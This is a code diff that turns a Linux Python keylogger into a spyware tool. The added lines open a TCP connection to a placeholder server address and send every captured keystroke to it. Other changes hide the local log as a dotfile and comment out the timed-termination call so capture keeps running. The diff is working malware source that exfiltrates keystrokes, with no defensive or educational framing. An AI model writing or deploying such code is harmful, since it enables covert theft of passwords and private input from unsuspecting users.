@@ -1,14 +1,26 @@
 import logging
 import random
 import pyxhook as pyx # Allows for working on linux
+import socket
+
+clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+
+# Connect to the server
+# Enter SERVER IP
+clientSocket.connect(("[SERVER IP]",9999));
 
 # Create the file
-logging.basicConfig(filename="keyfile.log", level=logging.INFO)
+logging.basicConfig(filename=".keylog.log", level=logging.INFO)
 
 def key_press(event):
 	# When a key is pressed log it
-    with open('keyfile.log', 'a') as f:
+    with open('.keylog.log', 'a') as f:
         f.write('{}\n'.format(event.Key))
+    
+    # Send the data to the server
+    data = event.Key
+    clientSocket.send(data.encode())
+    clientSocket.send(b"\n")
 
 # Waste time instead of sleep
 def calculator():
@@ -29,6 +41,6 @@ keylogger_hook.HookKeyboard()
 
 try:
 	keylogger_hook.start()
-	calculator() # comment out this line for persistance
+	# calculator() # uncomment out this line for auto termination
 except KeyboardInterrupt:
 	pass
